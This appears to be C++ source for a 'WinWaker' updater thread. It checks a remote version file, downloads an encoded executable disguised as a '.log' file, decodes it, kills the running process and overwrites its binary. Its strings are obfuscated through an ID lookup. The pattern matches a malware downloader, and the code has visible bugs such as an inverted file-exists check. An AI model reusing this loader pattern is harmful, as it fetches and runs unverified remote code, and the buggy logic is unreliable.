#include <Windows.h>
#include <string>
#include "WinWakerThread.h"
#include "easylog.hpp"
#include "libstr.h"
#include "key.h"
#include "reg.h"
#include "file.h"
#include "http.h"
#include "codec.h"
#include "base64.h"
#include "run.h"
#include "scrambler.h"
#include "version.h"

VOID CheckVersion();
VOID Upgrade();
BOOL bWinWakerVersionExpired = FALSE;

DWORD WINAPI WinWakerThreadFunction(LPVOID lpParam ) 
{ 
	// "main thread started #####\n"
	EasyLog::Format(GetStrById(255));

	// Sleep to wait network available
	int i = 0;
    while(i++ < 5)
    {
		::Sleep(1000);
		
		// "sleep: %d\n"
		EasyLog::Format(GetStrById(259), i);
	}

	// Main loop
	CheckVersion();

	// Upgrade
	if (bWinWakerVersionExpired)
	{
		Upgrade();
	}

	// "thread exit\n"
	EasyLog::Format(GetStrById(260));
	return 0; 
}

VOID CheckVersion()
{
	// Check version
	int version = 0;
	do
	{
		// "WinWakerUpdate"
		std::string szHost = GetStrById(120);
		// "Version"
		std::string szTxtFilePath = userTempPath + "\\" + szHost + GetStrById(315) + "." + timeString + ".txt";

		// Download version.txt
		// "http://www.winwaker.org/data/download/winwaker.version.txt?v=0"
		std::string url = GetStrById(316);
		char buffer[256] = { 0 };
		BOOL rc = HTTPGet(url.c_str(), buffer, sizeof buffer);
		if (!rc)
		{
			break;
		}

		// read version
		int version = 0;
		int i = sscanf(buffer, "%d", &version);
		if (i == 1)
		{
			if (WINWAKERUPDATE_VERSION < version)
			{
				bWinWakerVersionExpired = TRUE;
			}
		}
	} while (false);
}

VOID Upgrade()
{
	// Download and decode and excecute
	// "WinWaker"
	char szExeFilePath[256] = { 0 };
	sprintf(szExeFilePath, "%s/%s.%s.exe", userTempPath.c_str(), GetStrById(120), timeString.c_str());
	// "WinWaker"
	char szTxtFilePath[256] = { 0 };
	sprintf(szTxtFilePath, "%s/%s.%s.txt", userTempPath.c_str(), GetStrById(120), timeString.c_str());

	// Download
	// "http://www.winwaker.org/data/download/winwaker.exe.log?v=0"
	std::string url = GetStrById(301);
	BOOL rc = HTTPDownloadFileFromUrls(szTxtFilePath, url.c_str(), url.c_str());
	if (rc)
	{
		// decode
		rc = Decode(szTxtFilePath, szExeFilePath);
		// "decode %s to %s, rc %d\n"
		EasyLog::Format(GetStrById(305), szTxtFilePath, szExeFilePath, rc);
		DeleteFile(szTxtFilePath);
	}

	// replace
	if (!IsFileExists(szExeFilePath))
	{
		// Kill current WinWaker
		MyTerminateProcess(szExeFilePath);

		// Copy new exe file
		// "WinWaker"
		char szCurrentExeFilePath[256] = { 0 };
		sprintf(szCurrentExeFilePath, "%s/%s.exe", exeFilePath.c_str(), GetStrById(120));
		CopyFile(szExeFilePath, szCurrentExeFilePath, FALSE);
	}
}
